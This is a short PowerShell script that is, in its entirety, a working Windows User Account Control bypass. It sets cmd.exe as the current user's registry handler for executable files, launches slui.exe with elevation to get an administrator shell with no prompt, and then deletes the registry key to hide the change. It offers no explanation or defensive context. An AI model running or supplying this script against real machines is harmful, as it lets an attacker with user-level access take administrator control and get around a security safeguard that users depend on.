$program = "cmd.exe"
New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force
#For x86 shell in Windows x64
#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process "C:\Windows\System32\slui.exe" -Verb runas"
Start-Process "C:\Windows\System32\slui.exe" -Verb runas
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force